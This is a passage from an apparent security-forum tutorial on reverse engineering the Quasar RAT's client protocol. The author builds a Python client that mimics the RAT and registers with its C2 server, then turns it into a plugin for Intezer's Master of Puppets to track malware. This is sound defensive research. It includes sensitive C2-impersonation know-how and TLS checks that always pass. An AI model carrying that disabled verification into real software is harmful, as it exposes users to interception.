<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/5/58cd62f79aaa9517d08ae19fff74e194f9605f0f.png" data-download-href="/uploads/short-url/cFA3tNRgvps3JFuMEJqVcx5ft1B.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/58cd62f79aaa9517d08ae19fff74e194f9605f0f.png" alt="" data-base62-sha1="cFA3tNRgvps3JFuMEJqVcx5ft1B" width="624" height="297" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/5/58cd62f79aaa9517d08ae19fff74e194f9605f0f_2_10x10.png"></a></div><p></p>
<p>So <strong>socket.Connect</strong> function should connect me to the server successfully and initiate the first TCP handshake :</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/6/67d8ece9ce0212ed83d0c080f332a46728accf11.png" data-download-href="/uploads/short-url/eOFWhDQcAZGYg0YlVaRaO0bqWUV.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/67d8ece9ce0212ed83d0c080f332a46728accf11.png" alt="" data-base62-sha1="eOFWhDQcAZGYg0YlVaRaO0bqWUV" width="624" height="29" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/6/67d8ece9ce0212ed83d0c080f332a46728accf11_2_10x10.png"></a></div><p></p>
<p><img alt="">Next I want to examine what happens when we execute line <strong>287</strong>.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/0/0c651524a48408ec3d641e646b79c1435643fbb4.png" data-download-href="/uploads/short-url/1LEitSJqzVMB6kwGEA8m09hRFnS.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/0c651524a48408ec3d641e646b79c1435643fbb4.png" alt="" data-base62-sha1="1LEitSJqzVMB6kwGEA8m09hRFnS" width="624" height="87" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/0/0c651524a48408ec3d641e646b79c1435643fbb4_2_10x10.png"></a></div><p></p>
<p>This is an SSL handshake, but what happened is that the server passed its <strong>X509</strong> cert to the client and the client approved this certification, and this is happening inside <strong>RemoteCertificationValidationCallBack</strong>. Let's examine how it looks inside the source code</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/5/5bf69ac95a8f87657ef5d26712308003482ea312.png" data-download-href="/uploads/short-url/d7xNsL8F5wx0OveDuCDjpDc6WIi.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/5bf69ac95a8f87657ef5d26712308003482ea312.png" alt="" data-base62-sha1="d7xNsL8F5wx0OveDuCDjpDc6WIi" width="624" height="101" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/5/5bf69ac95a8f87657ef5d26712308003482ea312_2_10x10.png"></a></div><p></p>
<p>As you can see within the # <strong>else</strong> statement which happens when the binary is compiled with debug mode off, there is a function that checks if the clients and the servers certificate match. But look at what happens within the debug mode, it just returns true and because this happens on the client side… our client emulator can do the same to initiate a valid SSL communication with the server. Let's keep this in mind and continue. What happens next is a bit tricky, in line <strong>290</strong> inside the <strong>Client</strong> Class, <strong>OnClientState</strong> would be called but because it is called from the <strong>Client</strong> class the event registration function would hit and not the event handler function.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/d/d3989424bd85ac937f044ab08bceb3cee6c0e634.png" data-download-href="/uploads/short-url/ubRDXO5JVsSKjqXlYr74dnv98oY.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/d3989424bd85ac937f044ab08bceb3cee6c0e634.png" alt="" data-base62-sha1="ubRDXO5JVsSKjqXlYr74dnv98oY" width="624" height="164" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/d/d3989424bd85ac937f044ab08bceb3cee6c0e634_2_10x10.png"></a></div><p></p>
<p>We must find the <strong>QuasarClient</strong> class manually and from there navigate to the <strong>OnClientState</strong>** function**(I advise the reader to read this a few times and to play around with the source code to fully understand what this means as this is very important to understand how the client behaves, and having the source code is just a privilege to expand on our researching and coding skills). "But Danus! How will we find it in this mess of unnamed functions? " The answer to that is very simple, let us return to<strong>Class0 <strong>which is</strong> Program.cs:</strong></p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/a/a17b021202b56c3cd04b28e678375b0e25293700.png" data-download-href="/uploads/short-url/n2wpOsNyNw8RQhEi9l5ISK0TOOk.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/a17b021202b56c3cd04b28e678375b0e25293700.png" alt="" data-base62-sha1="n2wpOsNyNw8RQhEi9l5ISK0TOOk" width="624" height="114" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/a/a17b021202b56c3cd04b28e678375b0e25293700_2_10x10.png"></a></div><p></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/343c9167f8e4d5a25b56cb171e7582278f029dc2.png" alt="" data-base62-sha1="7s6ASmWRsPedJthQshOa2kwf3BU" width="427" height="215"></p>
<p>So <strong>Gclass27</strong> is <strong>QuasarClient</strong> , lets rename it so it would be easier to navigate to it, then we'll access this class by double clicking it and try to find <strong>OnClientState</strong> Manually.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/cdc06de0621729514ee87eec2ad0efa61e26e449.png" alt="DfyeA0y3IoaTpbrUvr7VKCJT3KvGcufsB_aubRnTGlaYNtWwCK2DX2Xiw0ZAsX7kvI1eZgHVcEesHk7dkRdTs7wPDO1lsvc9s_bZdH7Z5SS4Ou3pcfQ0D7S1TD4OnC9RAEofgPq15Eu_Ni3b1Q" data-base62-sha1="tma9RCXP7dYW9EbMTgpsUBNPYz7" width="655" height="426"></p>
<p>Here it is, let's place a breakpoint on line <strong>79</strong> , and set a breakpoint inside the <strong>PayloadWriter WriteBytes</strong> function we found earlier which is located inside dnspy under <strong>Stream1, method02</strong>. On line 79 <strong>Class18</strong> is created, and then passed into the send function. Class 18 is called <strong>ClientIdentification</strong> within the source code of Quasar:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/bf4ac3b3b625c7c500a4dd55928ffa1a72dddd9a.png" alt="T_cm4zK80WAi5XFktdbGERi_u9hTa-xh6lN6a89jOhZSnP0tkv5iPZpDuIMJJS7mktlSGG_pKoj8FMMINyCUqafbSW2-g4PV1g9_tlCqhjk27PJTSOHC2kJ5uNwDyXT1CQup_Lrkfcd-XujsLg" data-base62-sha1="rifnuMfqIPP2dw5qG6un9Bz2gS6" width="639" height="364"></p>
<p>Which is the message constructor and if we continue the execution up until the payload writer, we can see the contents of this message:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/9/9565726de9eedb99624699985a56804ad3e7c0cb.png" data-download-href="/uploads/short-url/ljCuwhGsL3tQw3Rb8TqdKPPMzJ9.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/9565726de9eedb99624699985a56804ad3e7c0cb.png" alt="" data-base62-sha1="ljCuwhGsL3tQw3Rb8TqdKPPMzJ9" width="624" height="420" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/9/9565726de9eedb99624699985a56804ad3e7c0cb_2_10x10.png"></a></div><p></p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/e/eb8d46a63634307cfbe05a594da7ddad5224ce61.png" data-download-href="/uploads/short-url/xBMT3dlkEhLRerCkcD7dNibEkWl.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/eb8d46a63634307cfbe05a594da7ddad5224ce61.png" alt="" data-base62-sha1="xBMT3dlkEhLRerCkcD7dNibEkWl" width="624" height="381" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/e/eb8d46a63634307cfbe05a594da7ddad5224ce61_2_10x10.png"></a></div><p></p>
<p>And we just intercepted the entire message. Easy. But how ever I do want to note something strange, there are only 14 members inside the <strong>ClientIdentification</strong> class but here inside the debugged message there are 28?</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/f6d7a5e01006c93dcce010e4378ed6b3d5e4d4fe.png" alt="" data-base62-sha1="zdFtQf6qUaaNJsnfPsWqqB1f7yK" width="502" height="101"></p>
<p>In addition, in line 38 the message gets copied into a stream and <strong>serialized</strong> then the length of the message is sent and then the raw bytes returned from the <strong>serializer</strong> function are sent. What in the hell is a <strong>Serializer</strong> and why are there <strong>28</strong> items in the message protocol when there should be only <strong>14</strong>? Also look at the contents of the message after it gets serialized. First let's debug the program until line <strong>40</strong> and view the contents of the <strong>array</strong> variable by right click it and then clicking on <strong>show memory window</strong>.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/9/993e49da57198dfd3533f8c359fc7db2de727926.png" data-download-href="/uploads/short-url/lREvkWwkwigHKogWBgz24rLWGMu.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/993e49da57198dfd3533f8c359fc7db2de727926.png" alt="" data-base62-sha1="lREvkWwkwigHKogWBgz24rLWGMu" width="624" height="223" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/9/993e49da57198dfd3533f8c359fc7db2de727926_2_10x10.png"></a></div><p></p>
<p>One can recognize some the message text but there are so many extra bytes here that just don't make sense at all.</p>
<hr>
<h2><strong>Message Serialization and Google Protocol Buffer</strong></h2>
<p>So, to save the reader the time it took me to fully understand what the hell is going on here, serialization is a method to compress a message size and make its processing more efficient. Many types of serialization exist, one can compress a message to a json format or an XML format and send it to a socket, the receiving side would de-serialize the message on a pre agreed protocol. You can learn about serialization here: <a href="https://www.youtube.com/watch?v=uGYZn6xk-hA" rel="noopener nofollow ugc">https://www.youtube.com/watch?v=uGYZn6xk-hA</a></p>
<p>Quasar uses something Protobuf which is developed by google, Protobuf Is also a message serializer (which I hope you know after watching the video I've sent above)</p>
<p>Alright, this brings as to these <strong>ProtoMembers</strong> we saw earlier:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/e/e42dcec5f3d29e9f62990fb31485c409dfd74e53.png" data-download-href="/uploads/short-url/wyz0mo3Z7zr2MWmbpYqnE5Ze0Bt.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e42dcec5f3d29e9f62990fb31485c409dfd74e53.png" alt="" data-base62-sha1="wyz0mo3Z7zr2MWmbpYqnE5Ze0Bt" width="361" height="500" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/e/e42dcec5f3d29e9f62990fb31485c409dfd74e53_2_10x10.png"></a></div><p></p>
<p>This C# class is defined under the <strong>ProtoContract</strong> which lets the compiler know that upon generating these 14 members, to generate a google <strong>protobuf</strong> message with 14 members. That's why for each class member there is a proto member. Now the protobuf protocol compresses each type (int32, int64, string) differently and that's why we see a lot of strange bytes in our message. This essentially answers goals 1-3 we set up before.</p>
<p>It's clear what we must do next:</p>
<ol>
<li>Create a python script that initiates an SSL connection</li>
<li>Validate the connection between the client and the server</li>
<li>Generate a protobuf message to match exactly the message that is sent by our generated client.</li>
</ol>
<p>Important note on number 3, We can safely assume that the only important parts of the message are the <strong>Tag</strong> , <strong>Signature</strong> and <strong>EncryptionKey</strong> members and from the tests I've conducted they must remain static and match the generated client exactly. Which makes sense as <strong>Signature</strong> and <strong>EncrpytionKey</strong> are the members which contain information from the <strong>X509</strong> Certificate.</p>
<h3><strong>Learning to write Pythonic Protobuf messages</strong></h3>
<p>So luckily for us, Google has made a programming interface for creating protobuf message with python and a tutorial which can be found here:<a href="https://developers.google.com/protocol-buffers/docs/pythontutorial" rel="noopener nofollow ugc">https://developers.google.com/protocol-buffers/docs/pythontutorial</a></p>
<p>I've crafted a message and script that initiates an SSL connection to our server:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/d0861a470b488b7e4683e1dc385086a32d0df928.png" alt="" data-base62-sha1="tKGCTUyDJhSQSN7qnhGg2tDh6lO" width="286" height="365"></p>
<p>First the message is rather simple, it contains 14 members which match the exact same members in the Quasar client. One can follow the tutorial I've linked on how to compile this message.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/593aa8ff1db992dfae87d36df97014d83f002f0c.png" alt="" data-base62-sha1="cJmaLuKL5598aDu5H756rAIH1dW" width="527" height="240"></p>
<p>This little script creates an SSL socket and deals with the verification problem, by always returning 1 on each certificate returned. This is cheating but hey, we are hackers :3</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/3d149ad855f09c83a9da4925b10d73518f7e74cd.png" alt="" data-base62-sha1="8IlgPjwNFvoX3bDMmaahDKbwrpz" width="462" height="64"></p>
<p>Now to check our code, lets generate a message and serialize it. Remember that it must be appended with 4 little endian bytes that would represent the total size of our message.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8a796a2cecf41db894e224a508dcbb3a14c0a239.png" alt="" data-base62-sha1="jL01i1Xt5u99kbCpQgE3mZxqQUV" width="418" height="45"></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/46759e82bc6340dea1ef85fb874b9b6249b0994c.png" alt="" data-base62-sha1="a3jq5Ov2a5ersFrxPW8cJSu5740" width="440" height="90"></p>
<p>So, I've created a little function that would return exactly that and prefix it to the serialized message, now let's generate our message, serialize and print it and see if it matches to what Quasar generates.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/b1bac29e3cdc61567bb3cad10739a90843d39d2e.png" alt="" data-base62-sha1="pmgDWlorLTk2bm2WyDkV97NEiWG" width="323" height="25"></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/312c95dc21975fc09a7cacd88859ca8eb4c6bf38.png" alt="" data-base62-sha1="710V1KswedxQ69lnSHY51OpIJEA" width="378" height="22"></p>
<p>As you can see, there is a problem with the first bytes. The message generated by python matches exactly (ignore the prefixed size 0xdf 0x02 0x00 0x00) to the C# message besides the first three bytes. <strong>0x0A, 0xCF, 0x05.</strong> What are these prefixed bytes? I didn't know so I've asked on stack overflow:</p>
<p><a href="https://stackoverflow.com/questions/61412249/protobuf-net-unrecognized-stream-prefix/61425656%2361425656%20" rel="noopener nofollow ugc">https://stackoverflow.com/questions/61412249/protobuf-net-unrecognized-stream-prefix/61425656#61425656</a></p>
<p>After a small research, I determined that this prefix can only be the length of the message. As the rest of the python generated message matches the C# generated python message exactly. In addition, if we edit the variables the Quasar Client message is sending, this first prefix field would chance as we increase the length of our message. For example – lets debug our Quasar client instance again and break on the Payload Writer function at line 36 just before the message is sent and edit the message contents by adding an arbitrary amount of <strong>'A'</strong> characters to one of the fields.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/f01e2d1976fcce2e011a6dc4b1c84f3cbdac509c.png" alt="" data-base62-sha1="ygbfbZ5HJasT5nEZUx3fVJhMPSc" width="624" height="105"></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/edc6ce64d4a55b696ec4cd78076b4d750b1f1c8b.png" alt="" data-base62-sha1="xVt6fKsEGHbUhbVcM9cwEryxYsr" width="548" height="108"></p>
<p>As you can see, the message was changed and from 0xcf the second byte turned to 0xf5. The difference between 0xF5-0xCF is 38 decimal which is the exact amount of 'A' chars I've added. To craft this kind of integer length encoder we must first understand how this byte sequence is encoded and luckily for us Google won't keep that a secret:</p>
<p><a href="https://developers.google.com/protocol-buffers/docs/encoding" rel="noopener nofollow ugc">https://developers.google.com/protocol-buffers/docs/encoding</a> and in addition this was explained to me in length in the answer here <a href="https://stackoverflow.com/questions/61412249/protobuf-net-unrecognized-stream-prefix/61425656%2361425656%20" rel="noopener nofollow ugc">https://stackoverflow.com/questions/61412249/protobuf-net-unrecognized-stream-prefix/61425656#61425656</a></p>
<p>I won't go into detail explaining how this entire thing works, I've did that for my own self-interest (and I advise you do that as well, <a href="https://twitter.com/marcgravel" rel="noopener nofollow ugc">@marcgravell</a> on stack overflow explained it perfectly) but understanding this interferes with our main goal. Do we have to reimplement the entire thing from scratch when Google Protobuf is open source? The answer to that is no.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e07e767e4ccb9a279a80096650845d4172ffeebd.png" alt="" data-base62-sha1="w1XTJ3DsvsBXZB1GtOoJgXkV9cp" width="624" height="33"></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/25c252b764cb8cf951480d05e398ef7ac4d49ceb.png" alt="" data-base62-sha1="5o206JradAYDbHGVzYLFZP7300P" width="363" height="261"></p>
<p>In these two code blocks, I'm serializing a message and passing its length into a function I've "Borrowed" <a href="https://github.com/protocolbuffers/protobuf/blob/master/python/google/protobuf/internal/encoder.py" rel="noopener nofollow ugc">from the encoder script on protobuf GitHub</a>. I've edited it a little bit by making it always prepend the <strong>0x0A</strong> byte to final result which represents the field number and field type. Since this message is prefixed to our generated message its always going to be of type 2 ( <strong>length prefix</strong> ) and field number 1 this combo will always yield byte <strong>0x0A</strong>.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/88a8b450c3eac9a4a4c9813974d8d0199a757f2e.png" alt="" data-base62-sha1="juWnLMTZOSlqJHgPwIbEnE6rLlk" width="289" height="18"></p>
<p>Boom. Now our pythonic message matches the C# Quasar generated message.</p>
<p>Now, on to the connection part:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/5e4f2da229b52cee9646e5c2868744543755e925.png" alt="" data-base62-sha1="dsiwi9KYRlHzgfqDfjJrURyGKYR" width="289" height="134"></p>
<p>This little code block will connect to our server and perform a handshake with it. Which will trigger the server to pass its <strong>X509</strong> certification, then our verification function will trigger:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/2dd0165b6986f1efa2c20a2dec22bc10e9ecc8df.png" alt="" data-base62-sha1="6xhjiliOkk45p8xAuwwDVGa4fnh" width="442" height="78"></p>
<p>Which will always return True. Then we're going to write our serialized message, prefixed with the length of the message + the length of the message serialized using this code block:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/ef0942df4c531dbb814e814c2014574b8e097b9a.png" alt="" data-base62-sha1="y6BXmFeSHe8etNbFyrKgJerHPce" width="470" height="134"></p>
<p>First at line 97, I serialize the message. Then I append a prefix which represents the size of the message to the message. Finally, I calculate the entire size of the message including the prefix, convert the size to little endian byte format and append that as well to the serialized message. The message is sent over to the server and we can view this inside Wireshark:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/48616c8495e7c671deaeb50be0c7ba8e02617604.png" alt="" data-base62-sha1="akj6FENsriwD9GnibR3BXTwEBKI" width="624" height="92"></p>
<p>Amazing! and if we check our quasar server, we can see that:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e9c8703a863d935e004c215536fe961e0f623b86.png" alt="" data-base62-sha1="xm8GEfIcIlr2FLTAfO2XLHhhjfM" width="624" height="73"></p>
<p>I've sent a custom message that was registered with no problem! Now I headed out to learn how Intezers tool works so I could turn my little test python script to a full Quasar RAT tracker.</p>
<p>The entire script can be found here <a href="https://github.com/DanusMinimus/Master-Of-RATs/blob/master/test_script.py" rel="noopener nofollow ugc">https://github.com/DanusMinimus/Master-Of-RATs/blob/master/test_script.py</a></p>
<hr>
<h2><strong>Creating a Quasar Plugin for Intezers Master of Puppets</strong></h2>
<p>This part is a bit trickier as Intezer is not actively developing this tool, but I would go to length as to explain how this tool works and save the hard work for you as I do believe this tool holds great value for tracking malware.</p>
<p>Master of Puppets is a collection of python scripts which allow to emulate a whole blown OS environment thus, saving the researcher the time and resources needed to set up honey pots or virtual machines. Now the cool thing is that we don't need to set up a whole blown OS + Kernel and a boot loader as most malware would want to interact with specific user mode applications and the file system and those are easy to emulate! How does it work? Master of Puppets comes packaged with utilities scripts and handlers that emulate and deal with basic functions to handle the malware such as connect, register, send, receive, and loop. The only job the researcher has is to create plugins for specific malware and the tool will handle the rest of the problems. I would like to walk the reader through the code and together create a diagram to help developers understand how this tool works. First download <a href="https://github.com/intezer/MoP" rel="noopener nofollow ugc">https://github.com/intezer/MoP</a> and my custom plugins quasar.py, targets.yaml, utils.py and bring our also previously created proto class from here <a href="https://github.com/DanusMinimus/Master-Of-RATs" rel="noopener nofollow ugc">https://github.com/DanusMinimus/Master-Of-RATs</a></p>
<p>Next please follow the installation guide here <a href="https://intezer.github.io/MoP/docs/html/index.html" rel="noopener nofollow ugc">https://intezer.github.io/MoP/docs/html/index.html</a></p>
<p>If you are using sublime text editor, you can click on <strong>Project-&amp;gt;Add Folder to project-&amp;gt;navigate to the downloaded tool</strong> and this should open a comfortable view of the project.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/b36670c4cac3d583133cac6feb922403ab16ba29.png" alt="" data-base62-sha1="pB2WAu6pY8IS0cmfYN7x6H5LrOF" width="624" height="472"></p>
<p>Please open <strong>orchestrator.py</strong> and remove the first line "#!/usr/bin/env python3.6" as it causes the tool not to run on any version other than python 3.6. so, this is our main script for this tool. Scroll to line 46, as you can see this a command parser and in our case we'll be using the option described in line 53 – <strong>targets-config</strong> which allows the tool to connect to multiple clients, so please open <strong>targets.yaml</strong> and remove the hashes with in it.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/6802d4fa67c6fb6441f13d871da94cba8a22becd.png" alt="" data-base62-sha1="eQ7IUnabU1okD5ktIx6JvTp6g3j" width="486" height="142"></p>
<p>I've already set it up to run with my instance of quasar but you can keep yours as is for now as we haven't set up our plugin yet. This tool sets up multiple targets, by specifying the IP, Port and the plugin for the target.</p>
<p>If we go back to the main script:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/9ec95dac31cd56bcf4a657d135debd2a91d5fe4e.png" alt="" data-base62-sha1="mEGRCidF7dLNpn2IzFXLis4GL4G" width="624" height="182"></p>
<p>What happens is at line 54, the <strong>targets.yaml</strong> file is parsed, and the contents of it are extracted. Then function connect_targets() is called:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/9bd4775dc44fea2df5db1536e29822300c3de4b6.png" alt="" data-base62-sha1="mexdjK2uDMmWK1att1mhkmBuBgy" width="612" height="78"></p>
<p>Which for each target found in the targets.yaml file executes the connect() function:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/b47aa0da02e84438fcb1ee458e9d07eee02ee2d5.png" alt="" data-base62-sha1="pKAFPo5QnbQbCtPEvCOIPNKJhit" width="624" height="215"></p>
<p>The connect function is found at line 22, it starts a thread with a callback function called _connect(), it passes the ip, port and the plugin into this function. _connect is called at line 27. First it imports a plugin from the plugin folder, then at line 29 it uses the plugin constructor to connect to the rat and then uses the plugins connect, register and loop functions. All the plugins that are created extend all the properties from the puppet_rat.py class. So, let's open it up:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/aa5b5ab1484183c45c166be9d5f7809205e9b76b.png" alt="G5Z4Wd9ZGhRbdKTIwlmlcpd4w6LnwrIDPgUk39M20yTAuouWwNRtxMD8oq6QKvEhH3BY0m0ZBNYTXle-4nT7tMsG5nwVfPrLcvYhzueXrgmY9fsfjke9k0lNgym6fdVXDZs3ER3HRVALbHtCJQ" data-base62-sha1="oj2TwEEDg8neAOvI0PJ2O8SkJej" width="595" height="500"></p>
<p>At line 16, we can see the constructor for this class which as we saw before at the main script is triggered in line 29. Here at line 16 the constructor sets up various client attributes. The ip, port, the fake process id, the logger which is used to log all events and the conn variable which is used to represent a socket. The most important functions are:</p>
<ol>
<li>
<p><strong>connect</strong> which is supposed to implement a connection to the server from the client.</p>
</li>
<li>
<p><strong>register</strong> which is supposed to implement the registration function</p>
</li>
<li>
<p><strong>loop</strong> which is supposed to mimic the infinite loop between the client which is waiting for orders from the server client</p>
</li>
</ol>
<p>It's clear what we must bring from our test script. First lets start with the easiest thing, let's edit the targets.yaml file to match our needs. An example can be found in the images above. Next please download <a href="https://github.com/DanusMinimus/Master-Of-RATs" rel="noopener nofollow ugc">quasar.py and clientidentity_pb2.py</a> from my repo linked above and place them inside the plugins folder.</p>
<p>Now I'm going to review my plugin code line by line:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8252dd4099e83ecec06b769be8a3c7c95a5af7d4.png" alt="" data-base62-sha1="iATBDqD03vMRsvarZyC0B1Dv0pK" width="624" height="307"></p>
<p>First let's discuss the constructor which as you can see extends the PuppetRat class, thus inheriting all its properties. I've added the message members so they can be edited on the fly. The only messages that a user has to set by himself are the <strong>Tag</strong>, <strong>EncryptionKey</strong> and the <strong>Signature</strong> as these interchange between client to client. In addition, I've added a protobuf message member called message which can be seen in line 70. It creates an uninitialized Quasar message.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/056eb1594ecca0467ec3254902d3d503bb2c9395.png" alt="" data-base62-sha1="M3xOXK1kRZGGfEl1cLjsiePY0t" width="507" height="494"></p>
<p>I've added 4 more custom functions that would allow the researcher to change the tag, id, key, and signature as he would seem fit and function that would create and set a protobuf message. The function __del__ is a standard python function which executes when the object gets destroyed and in this case it would just close the socket connection created for Quasar.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/a56b61f794880bd4b5639896320b2e705b163ae7.png" alt="" data-base62-sha1="nBmQDpMP8aUK8j1jm4PFxcbQttt" width="624" height="199"></p>
<p>The re implementation of the connect function which is very similar to the one in the test script. Before we review it, please download the utils.py file from my repo and place it inside the <strong>stage props</strong> folder as I've added several functions to it. First in line 112 I create a tcp socket, then I bind that socket to a SSL socket and context. The <strong>create_ssl_sock</strong> is a custom functions ive added to the <strong>utils</strong> script. Much like in our test script all it does is create an SSL socket and binds a context to it so we can verify the quasar certificate. Then, a connect is started to the Quasar server and a handshake is attempted. If all goes well, the logger should display a proper message.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/880465896765f9264f5066cfa3caa8a971cdce2c.png" alt="" data-base62-sha1="jpgm3mkldRCYRDS7faUJhD7iBwo" width="465" height="165"></p>
<p>Then we move on to the loop function, which is very primitive at the moment, all it does is receive messages from the server and displays them.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/fab464d951296ea63112cf98514f31e78b65be31.png" alt="" data-base62-sha1="zLPRjfWiCk9SxFQ1Plin6el7RND" width="624" height="165"></p>
<p>We move on to the register function, which is the final one, all it does is mimic exactly what would test script does. It constructs a Quasar message and sends it to the server. I wouldn't go into length about this as we discussed this already. Now finally, let's see how this run!</p>
<p>Start your virtual machine and launch the Quasar server, then start a shell within the MoP project and input the following command.</p>
<p>" <strong>py orchestrator.py –targets-config targets.yaml"</strong></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/493789c9752b11008147fca9e8ab9bac432d7599.png" alt="" data-base62-sha1="arHQpUXunE5tcBwNZ5dsvWbyk8V" width="624" height="66"></p>
<p><strong>YES!</strong> Alright let's see what happens if we try to execute functions from the server itself by forcing the client to open a message box:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/5e4ca85383cc960a40269143307c1ba70111c80d.png" alt="" data-base62-sha1="dsd7s5yPQqxUBCHS4X4Ps2h8t2d" width="624" height="253"><br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/f/f9ede6563b0519c96d7946a6fccff59e487ca511.png" alt="" data-base62-sha1="zEYAsjQiu8u1sXUtlGHD7SYD77X" width="624" height="127"></p>
<p>Amazing! As you can see, we received a new message which needs to be deserialized. This would require some more effort into reversing more messages but from our gained knowledge it shouldn't be too hard <img src="https://0x00sec.org/images/emoji/twitter/blush.png?v=9" title=":blush:" class="emoji" alt=":blush:"></p>
<p>This sums up the post, I hope you enjoyed it! I'll try to release a full version for this plugin sometime so stay tuned and in the meantime happy researching!</p>
<p>Special thanks to <a href="https://intezer.com/?utm_campaign=Brand%20ads&amp;utm_source=Google%20Ads&amp;utm_content=Brand&amp;utm_term=%2Bintezer&amp;utm_campaign=0719+RLSA&amp;utm_source=adwords&amp;utm_medium=ppc&amp;hsa_acc=6013738437&amp;hsa_cam=9281250457&amp;hsa_grp=94310168375&amp;hsa_ad=417088374601&amp;hsa_src=g&amp;hsa_tgt=aud-789535425270:kwd-765886859489&amp;hsa_kw=%2Bintezer&amp;hsa_mt=b&amp;hsa_net=adwords&amp;hsa_ver=3&amp;gclid=CjwKCAjwqJ_1BRBZEiwAv73uwKTr5ccCuc8K2tgIYyav9-D83icOLLWYiHSsR4hI67yxn0xqzMEiYRoCmf0QAvD_BwE" rel="noopener nofollow ugc">Intezer</a>, <a href="https://twitter.com/marcgravell?lang=he" rel="noopener nofollow ugc">Marc Gravell</a> for this post as I probably wouldn't finish it without you.</p>
<p>And thanks to my best friend <a href="https://twitter.com/comeREwithme" rel="noopener nofollow ugc">x24whoamix24</a>  as without your encourgment I would still be avoiding these pesky network projects <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<hr>
<h2>Sources</h2>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://github.githubassets.com/favicons/favicon.svg" class="site-icon" width="32" height="32">
      <a href="https://github.com/intezer/MoP/" target="_blank" rel="noopener nofollow ugc">GitHub</a>
  </header>
  <article class="onebox-body">
